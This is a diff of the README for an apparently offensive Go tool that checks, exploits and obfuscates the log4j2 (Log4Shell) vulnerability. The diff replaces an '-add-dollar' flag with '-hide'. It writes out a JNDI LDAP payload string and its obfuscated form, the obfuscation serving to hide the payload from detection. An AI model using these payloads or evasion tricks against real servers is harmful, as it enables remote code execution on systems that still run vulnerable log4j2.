@@ -2,13 +2,12 @@
  [![GitHub Actions](https://github.com/For-ACGN/Log4Shell/workflows/Go/badge.svg)](https://github.com/For-ACGN/Log4Shell/actions)
  [![Go Report Card](https://goreportcard.com/badge/github.com/For-ACGN/Log4Shell)](https://goreportcard.com/report/github.com/For-ACGN/Log4Shell)
  [![GoDoc](https://godoc.org/github.com/For-ACGN/Log4Shell?status.svg)](http://godoc.org/github.com/For-ACGN/Log4Shell)
- [![License](https://img.shields.io/github/license/For-ACGN/Log4Shell.svg)](https://github.com/For-ACGN/Log4Shell/blob/master/LICENSE)
- * Check, exploit, obfuscate, TLS, ACME about log4j2 vulnerability in one Go program. 
- * Support common operating systems, not need install any dependency.
- * Don't need to install anything except you want to develop this project.
+ [![License](https://img.shields.io/github/license/For-ACGN/Log4Shell.svg)](https://github.com/For-ACGN/Log4Shell/blob/master/LICENSE)\
+ Check, exploit, obfuscate, TLS, ACME about log4j2 vulnerability in one Go program. 
 
 ## Feature
  * Only one program and easy deployment
+ * Support common operating systems
  * Support multi Java class files
  * Support LDAPS and HTTPS server
  * Support ACME to sign certificate
@@ -52,7 +51,7 @@
    
   ### Hide malicious(payload) string
    ```
-   Log4Shell.exe -obf "${jndi:ldap://127.0.0.1:3890/Calc}" -add-dollar
+   Log4Shell.exe -obf "${jndi:ldap://127.0.0.1:3890/Calc}" -hide
    ```
    ```
    raw: ${jndi:ldap://127.0.0.1:3890/Calc$YG=.z[.od7rH0XpE}
@@ -112,10 +111,10 @@
                                                         https://github.com/For-ACGN/Log4Shell
 
 Usage of Log4Shell.exe:
-  -add-dollar
-        add one dollar to the obfuscated string
   -auto-cert
         use ACME client to sign certificate automatically
+  -hide
+        hide obfuscated malicious(payload) string in log4j2
   -host string
         server IP address or domain name (default "127.0.0.1")
   -http-addr string
